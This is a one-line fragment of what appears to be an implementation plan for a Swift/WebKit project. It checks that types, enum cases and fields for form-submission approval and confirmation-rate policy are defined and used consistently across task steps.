+- **Type consistency.** `SubmissionDestination.line(pageURL:destination:)` is defined in Task 1 step 3 and called in step 9 with the same labels. `WebKitObservedElement.submissionDestination` is a `String?` in step 6, produced by the JavaScript in step 5, and read in step 9. `SubmissionApproval.Decision` cases `.allow`, `.refuseForeignOrigin(String)` and `.refuseUnapproved` are defined in Task 2 step 3, asserted in step 1 and switched in step 6. `WebKitSubmissionFacts` fields `origin`, `httpMethod`, `fieldCount`, `fieldNames` are declared in step 5 and asserted in step 7. `ConfirmationRatePolicy.Verdict` cases and the three static thresholds are defined in Task 3 step 3 and used in steps 1, 5 and 6. `WKFormInfo`'s property names are copied from `MacOSX27.0.sdk/.../WKFormInfo.h` rather than recalled.
